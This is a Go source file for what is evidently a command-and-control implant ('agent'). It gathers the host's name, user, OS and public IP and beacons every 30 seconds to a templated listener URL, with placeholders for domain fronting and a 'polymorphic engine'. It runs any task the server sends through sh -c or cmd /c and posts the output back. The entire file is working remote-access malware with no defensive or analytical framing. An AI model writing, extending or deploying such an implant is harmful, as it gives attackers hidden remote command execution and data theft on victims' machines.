// agent/main.go
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

// These placeholders will be replaced by the polymorphic engine
const (
	ListenerURL = "{{LISTENER_URL}}"
	FrontDomain = "{{FRONT_DOMAIN}}"
	HostHeader  = "{{HOST_HEADER}}"
	AgentID     = "{{AGENT_ID}}"
)

type Beacon struct {
	AgentID  string `json:"agent_id"`
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	IP       string `json:"ip"`
}

type TaskResponse struct {
	Task string `json:"task"`
}

func main() {
	// Gather system info
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if runtime.GOOS == "windows" {
		username = os.Getenv("USERNAME")
	}
	osStr := runtime.GOOS + " " + runtime.GOARCH

	beacon := Beacon{
		AgentID:  AgentID,
		Hostname: hostname,
		Username: username,
		OS:       osStr,
		IP:       getOutboundIP(),
	}

	for {
		task, err := sendBeacon(beacon)
		if err != nil {
			fmt.Println("Beacon error:", err)
			time.Sleep(30 * time.Second)
			continue
		}
		result := executeTask(task)
		sendResult(result)
		time.Sleep(30 * time.Second)
	}
}

func sendBeacon(b Beacon) (string, error) {
	body, _ := json.Marshal(b)
	req, err := http.NewRequest("POST", ListenerURL+"/beacon", bytes.NewReader(body))
	if err != nil {
		return "", err
	}
	req.Header.Set("Host", HostHeader)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("status: %d", resp.StatusCode)
	}

	var taskResp TaskResponse
	if err := json.NewDecoder(resp.Body).Decode(&taskResp); err != nil {
		return "", err
	}
	return taskResp.Task, nil
}

func executeTask(task string) string {
	switch task {
	case "whoami":
		cmd := exec.Command("whoami")
		out, err := cmd.Output()
		if err != nil {
			return "error: " + err.Error()
		}
		return string(out)
	case "hostname":
		cmd := exec.Command("hostname")
		out, err := cmd.Output()
		if err != nil {
			return "error: " + err.Error()
		}
		return string(out)
	default:
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/c", task)
		} else {
			cmd = exec.Command("sh", "-c", task)
		}
		out, err := cmd.Output()
		if err != nil {
			return "error: " + err.Error()
		}
		return string(out)
	}
}

func sendResult(result string) {
	payload := map[string]string{
		"agent_id": AgentID,
		"result":   result,
	}
	body, _ := json.Marshal(payload)
	req, err := http.NewRequest("POST", ListenerURL+"/result", bytes.NewReader(body))
	if err != nil {
		return
	}
	req.Header.Set("Host", HostHeader)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	client.Do(req)
}

func getOutboundIP() string {
	req, _ := http.NewRequest("GET", "https://api.ipify.org?format=text", nil)
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "unknown"
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return string(body)
}